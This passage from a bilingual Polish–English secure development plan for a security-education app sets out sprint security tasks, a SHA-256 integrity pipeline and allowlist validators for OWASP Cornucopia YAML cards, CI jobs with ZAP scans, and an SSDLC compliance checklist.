  - Penetration test checklist dla nowych stron (FRE, LLM, AAI, STRIDE, MLSec, Mobile, DevOps)
  - Weryfikacja: ContentIntegrityVerifier działa na wszystkich 6 plikach YAML
  - Weryfikacja: wszystkie 7 *RefValidator klas przechodzą testy

Sprint 16 (Production Hardening + Release):
  - Content hash pipeline: CI job hash-generator aktualizuje data/hashes.json przy każdym merge do main
  - Final DAST: ZAP full scan na staging → 0 HIGH/CRITICAL findings
  - Security sign-off: security engineer przegląda wszystkie SR-12.*–SR-18.* przed release
  - Production deploy z manualnym gate (jak Sprint 8)
  - Post-deploy smoke test: wszystkie suit endpoints, ContentIntegrityVerifier log check
```

### 8.5 Zarządzanie treścią kart YAML jako aktywami bezpieczeństwa

Sześć plików YAML kart Cornucopia (`data/cornucopia/*.yaml`) są aktywami bezpieczeństwa — zawierają autorytatywne treści edukacyjne, które mogą stać się wektorem ataku jeśli zostaną naruszone. Poniższy pipeline zapewnia integralność treści przez cały cykl życia aplikacji.

```
PIPELINE INTEGRALNOŚCI TREŚCI YAML:

┌─────────────────────────────────────────────────────────────────────────┐
│  PROPOZYCJA ZMIANY (PR w GitHub)                                        │
│  ├── Autor: dowolny contributor                                          │
│  ├── Wymagani recenzenci: @security-team (CODEOWNERS: data/cornucopia/)  │
│  └── Wymagane 2 zatwierdzeń przed merge                                 │
└─────────────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  CI: job "yaml-content-integrity" (uruchamiany na każdym PR)            │
│  ├── YAML schema validation (JSON Schema dla card structure)             │
│  ├── *RefValidator: każdy owaspRef/mitreRef walidowany przez allowlist   │
│  ├── Script/HTML injection scan (grep dla <script>, <img onerror etc.)  │
│  └── hash-generator: SHA-256 każdego YAML → data/hashes.json            │
└─────────────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  MERGE DO MAIN                                                           │
│  └── hashes.json zaktualizowany i zacommitowany przez bot               │
└─────────────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  DEPLOY: Spring Boot @PostConstruct                                      │
│  ├── ContentIntegrityVerifier.verify():                                  │
│  │     dla każdego pliku YAML: SHA-256(file) == hashes.json[file]       │
│  ├── NIEZGODNOŚĆ → ContentIntegrityException → aplikacja nie startuje    │
│  └── ZGODNOŚĆ → karty załadowane do cache (read-only)                   │
└─────────────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  RUNTIME: monitoring                                                     │
│  ├── Loki alert SEC-007: > 50 req/min na /api/v1/threats z jednego IP   │
│  ├── Loki alert SEC-008: jakikolwiek 400 z OwaspRefValidator (podejrzane)│
│  └── Metryka Prometheus: content_integrity_check_ok (1/0) — dla Grafana │
└─────────────────────────────────────────────────────────────────────────┘
```

**Klasy implementacyjne (nowe):**

| Klasa | Odpowiedzialność |
|---|---|
| `ContentIntegrityVerifier` | @PostConstruct — weryfikuje SHA-256 każdego pliku YAML |
| `OwaspRefValidator` | Allowlist: A01:2021–A10:2021, Client-Side C01–C10, LLM01–LLM10, AgentAI01–10 |
| `MitreAtlasRefValidator` | Allowlist MITRE ATLAS techniques z data/mitre-atlas-allowlist.json |
| `MavsRefValidator` | Allowlist OWASP MASVS 2.0 controls |
| `CicdSecRefValidator` | Allowlist CICD-SEC-01–CICD-SEC-10 |
| `OatRefValidator` | Allowlist OAT-001–OAT-021 (OWASP Automated Threats) |
| `YamlCardSchemaValidator` | JSON Schema validation całej struktury YAML card na CI |

### 8.6 Rozszerzone testy bezpieczeństwa (US-12–US-18)

#### Nowe testy abuse cases w CI pipeline

```yaml
# Dodaj do .github/workflows/ci.yml

  yaml-content-integrity:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { java-version: '21' }
      - name: Verify YAML content integrity
        run: mvn -f backend/pom.xml test -Dtest=ContentIntegrityVerifierTest
      - name: Validate OWASP/MITRE refs
        run: mvn -f backend/pom.xml test -Dtest="OwaspRefValidatorTest,MitreAtlasRefValidatorTest"
      - name: Scan YAML for injection patterns
        run: |
          if grep -rn "<script\|onerror\|javascript:" data/cornucopia/; then
            echo "INJECTION PATTERN FOUND IN YAML CARDS"; exit 1
          fi

  abuse-cases-us12-us18:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16-alpine
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { java-version: '21' }
      - name: Run AC-09 through AC-13 tests
        run: |
          mvn -f backend/pom.xml test \
            -Dtest="RateLimitIT,XssAdminCardUpdateIT,YamlTamperDetectionIT,\
                    MitreAllowlistBypassIT,ClickjackingHeaderIT"

  dast-new-routes:
    needs: [backend-tests]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker compose up -d --wait
      - name: ZAP scan new Cornucopia routes
        run: |
          docker run --rm --network host \
            ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
            -t http://localhost:8080 \
            -c zap-rules-cornucopia.conf \
            --include "/frameworks/.*|/matrix/.*|/stride-heatmap"
```

#### Nowe testy regresji bezpieczeństwa po każdym sprincie Cornucopia

```
Po zakończeniu każdego sprintu 9–16:
  [ ] Re-run ContentIntegrityVerifierTest — weryfikuj, że hash pipeline działa
  [ ] Re-run wszystkich *RefValidator testów — weryfikuj nowe allowlisty
  [ ] ZAP baseline scan nowych endpoints z tego sprintu
  [ ] Sprawdź: żaden nowy komponent nie ma dangerouslySetInnerHTML
  [ ] Sprawdź: PODATNY/VULNERABLE label obecny na każdym attack code snippet
```

---

## SDLC × SSDLC Master Mapping Table

This table maps every SDLC phase to its SSDLC security activity, the relevant security tools, and the sprint where it occurs in this project.

| SDLC Phase | SSDLC Security Activity | Tools | Sprint |
|---|---|---|---|
| **Planning & Analysis** | Threat modeling (STRIDE), abuse cases, compliance mapping (NIS2, OWASP ASVS), security requirements traceability | Threat model template, STRIDE workshop | Sprint 0 |
| **Planning & Analysis** | Security tooling setup (pre-commit hooks, SAST, SCA, branch protection) | gitleaks, trufflehog, SonarQube, SpotBugs | Sprint 0 |
| **Design** | Trust boundary analysis, least privilege design, API security decisions D-01 through D-08 | Architecture review, STRIDE per component | Sprint 1 |
| **Design** | Data classification schema, JWT cookie strategy, DB role separation | Spring Security config | Sprint 1 |
| **Implementation** | Secure coding standards (J-01 through J-06, R-01 through R-05) | SpotBugs/FindSecBugs, eslint-security, SonarQube | Sprints 1–7 |
| **Implementation** | Security code review (mandatory DoD gate before DONE) | GitHub PR review, security checklist | Every sprint |
| **Implementation** | TDD with abuse cases (AC-01 through AC-08) | JUnit 5, Testcontainers | Sprints 2–6 |
| **Testing** | SAST on every CI push (zero HIGH findings required) | SpotBugs, FindSecBugs, eslint-plugin-security | Every push |
| **Testing** | SCA on every CI push (no CVSS ≥ 7.0 dependencies) | OWASP Dependency Check, npm audit, Trivy | Every push |
| **Testing** | DAST baseline on every staging deploy | OWASP ZAP baseline scan | Every merge to main |
| **Testing** | DAST full active scan + manual pen test | OWASP ZAP full scan | Sprint 8 |
| **Testing** | Abuse case integration tests | JUnit 5 + RestAssured + Testcontainers | Sprints 2–8 |
| **Deployment** | Infrastructure hardening checklist (Nginx, Spring, PostgreSQL, Redis, Docker) | Pre-production checklist (GitHub Issue template) | Sprint 8 |
| **Deployment** | Secrets management (no secrets in code/env vars in compose) | Docker secrets / Vault, GitHub Secrets | Sprint 8 |
| **Deployment** | Security headers (CSP, HSTS, X-Frame-Options, X-Content-Type) | Nginx config, Spring Security headers | Sprint 8 |
| **Deployment** | Container image vulnerability scan | Trivy | Every Docker build |
| **Maintenance** | Runtime monitoring with security alerts | Grafana + Loki, Alertmanager | Post-Sprint 8 |
| **Maintenance** | Patch management process (CVE triage, regression test, deploy) | Dependabot, Kanban board | Ongoing |
| **Maintenance** | Threat model quarterly review and update | threat_model.md, STRIDE workshop | Every 3 months |
| **Maintenance** | Incident response plan execution | PagerDuty, Loki, runbooks | On demand |
| **Planning (Cornucopia)** | Wymagania bezpieczeństwa SR-12.*–SR-18.* dla kart Cornucopia; abuse cases AC-09–AC-13 | Security req. matrix, abuse case template | Sprint 9 |
| **Design (Cornucopia)** | Decyzje projektowe D-09–D-13 (YAML integrity, allowlists, SVG rendering, pseudocode policy) | Architecture review, CODEOWNERS config | Sprint 9 |
| **Implementation (Cornucopia)** | ContentIntegrityVerifier, *RefValidator classes (7 nowych klas) | Spring @PostConstruct, JSON Schema, SHA-256 | Sprints 9–13 |
| **Implementation (Cornucopia)** | DOMPurify, AUTONOMY RISK badge, BotCardWarning, PODATNY labels na kartach atakujących | Vitest + RTL, SpotBugs | Sprints 9–13 |
| **Testing (Cornucopia)** | Abuse cases AC-09–AC-13 zintegrowane w CI; YAML injection scan grep job | JUnit 5, GitHub Actions, OWASP ZAP | Sprint 15 |
| **Testing (Cornucopia)** | DAST full scan nowych routów /frameworks/*, /matrix/*, /stride-heatmap | OWASP ZAP (zap-rules-cornucopia.conf) | Sprint 15 |
| **Deployment (Cornucopia)** | hash-generator CI job; content integrity pipeline; manual security sign-off SR-12–SR-18 | SHA-256, data/hashes.json, GitHub Actions bot | Sprint 16 |
| **Maintenance (Cornucopia)** | Loki alert SEC-007 (bot scraping), SEC-008 (ref validator 400s); content_integrity_check_ok metric | Grafana, Loki, Prometheus | Post-Sprint 16 |

---

## Agile Ceremonies — Security Integration Points

### Sprint Planning (Security Items)
```
Mandatory agenda item in Sprint Planning:
  "Security debt and vulnerability backlog review"
  - Review OWASP Dependency Check report from last sprint
  - Review any new CVEs in project dependencies
  - Assign story points to security fix items before feature items
  - Confirm at least 10% of sprint capacity reserved for security tasks
```

### Daily Standup (Security Flag)
```
In addition to standard standup questions:
  "Is there any security blocker or finding I need to escalate?"
  - Any SEC REVIEW kanban item stuck for > 1 day is escalated to SM immediately
```

### Sprint Review (Security Demo)
```
Mandatory demo item in Sprint Review:
  "Security gate results for this sprint"
  - Show SonarQube dashboard: 0 BLOCKER/CRITICAL issues
  - Show OWASP Dependency Check: 0 CVEs ≥ 7.0
  - Show SpotBugs: 0 HIGH security findings
  - Show new abuse case tests that were added this sprint
  - Any security finding from ZAP baseline scan?
```

### Sprint Retrospective (Security Retro)
```
Mandatory retrospective item:
  "What security shortcuts did we take this sprint?"
  Common retrospective findings and their fixes:
  - "We skipped SEC REVIEW on one PR" → Add SEC REVIEW to branch protection required checks
  - "We used String.format() with user input" → Add grep check to CI
  - "We left a TODO: validate this" → All security TODOs are Kanban items, not code comments
```

---

## Summary: SSDLC Compliance Checklist for SecureVision 2026

```
PLANNING
  [x] Threat model completed (STRIDE per component)
  [x] Abuse cases documented (AC-01 through AC-08)
  [x] Compliance requirements mapped (OWASP ASVS, NIS2, GDPR)
  [x] Security requirements traceable to functional requirements

DESIGN
  [x] Trust boundaries defined
  [x] Least privilege applied to DB roles, API endpoints, admin access
  [x] Security architecture decisions documented (D-01 through D-08)
  [x] Data classification scheme defined

IMPLEMENTATION
  [x] Secure coding standards documented (J-01 through J-06, R-01 through R-05)
  [x] SAST tools configured (SpotBugs, FindSecBugs, eslint-security)
  [x] Pre-commit secret detection configured (gitleaks, trufflehog)
  [x] Security-enforced Definition of Done documented

TESTING
  [x] SAST integrated in CI pipeline
  [x] SCA integrated in CI pipeline (Dependency Check + npm audit + Trivy)
  [x] DAST configured for staging environment (OWASP ZAP)
  [x] Abuse case tests written and integrated into test suite
  [x] Security regression test process defined

DEPLOYMENT
  [x] Infrastructure hardening checklist created
  [x] Secrets management strategy defined
  [x] Security headers specification complete
  [x] Manual approval gate before production deploy

MAINTENANCE
  [x] Runtime security monitoring alerts defined
  [x] Patch management process documented (Kanban lane)
  [x] Incident response plan documented
  [x] Threat model review schedule established

AI/LLM SPECIFIC
  [x] Unique risks of displaying attack code analyzed
  [x] Content integrity controls defined
  [x] Future AI feature security requirements documented
  [x] Rate limiting on all endpoints that could be weaponized

MODUŁ KART CORNUCOPIA (US-12–US-18)
  [ ] Macierz wymagań bezpieczeństwa SR-12.*–SR-18.* udokumentowana
  [ ] Nowe przypadki nadużyć AC-09–AC-13 napisane i skonwertowane do testów
  [ ] ContentIntegrityVerifier zaimplementowany i testowany (SHA-256 YAML)
  [ ] Pliki data/hashes.json zaktualizowane i commitowane przez CI
  [ ] CODEOWNERS skonfigurowany dla data/cornucopia/ (2 approvers required)
  [ ] OwaspRefValidator — allowlist A01–A10, LLM01–LLM10, AgentAI01–10
  [ ] MitreAtlasRefValidator — allowlist ATLAS techniques z JSON
  [ ] MavsRefValidator — allowlist MASVS 2.0 controls
  [ ] CicdSecRefValidator — allowlist CICD-SEC-01–10
  [ ] OatRefValidator — allowlist OAT-001–021
  [ ] DOMPurify zintegrowany w każdym komponencie renderującym opisy kart
  [ ] PODATNY/VULNERABLE label i dialog kopiowania na każdym przykładzie ataku
  [ ] AUTONOMY RISK badge na kartach AAI z nadmierną agencją (AAIK, AAIQ)
  [ ] BotCardWarning — wymagane "Rozumiem ryzyko" przed kartami BOT credential
  [ ] Rate limit Bucket4j: 60 req/min per IP na wszystkich suit endpoints
  [ ] SVG diagram rendering server-side (AAI diagramy — brak client-side JS)
  [ ] X-Frame-Options: DENY na /stride-heatmap (AC-13 clickjacking)
  [ ] CI job yaml-content-integrity: schema validation + injection scan + hash
  [ ] CI job abuse-cases-us12-us18: AC-09–AC-13 all GREEN
  [ ] DAST ZAP full scan nowych routów /frameworks/*, /matrix/*
  [ ] Loki alert SEC-007 (bot scraping rate), SEC-008 (ref validator 400s)
  [ ] Prometheus metric content_integrity_check_ok skonfigurowana
  [ ] Sprint security activities 9–16 udokumentowane i przestrzegane
  [ ] Decyzje projektowe D-09–D-13 udokumentowane i zaimplementowane
```
